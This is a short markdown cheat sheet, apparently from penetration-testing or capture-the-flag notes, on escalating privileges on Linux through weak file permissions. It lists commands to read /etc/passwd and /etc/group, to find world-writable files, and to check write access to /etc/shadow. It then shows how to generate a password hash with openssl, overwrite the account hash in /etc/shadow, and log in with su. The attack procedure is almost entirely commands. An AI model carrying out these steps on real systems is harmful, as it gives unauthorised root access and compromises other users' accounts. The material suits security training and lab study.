# Weak permissions
check other users -- ```cat /etc/passwd```  
check groups -- ```cat /etc/group```

**Enumerate list of files that can be modified by every user on system**  
1. ```find / -not -type l -perm -o+w```  
2. check for /etc/shadow  
3. confirm you can edit the shadow file -- ```ls -al /etc/shadow```. Looks for rw access
4. use open ssl to replace password -- ```openssl passwd -1 -salt abc password```
5. copy the value
6. vim/nano /etc/shadow
7. replace asterisk with your hash (if Vim, keep cursor on first colon)
8. login with su
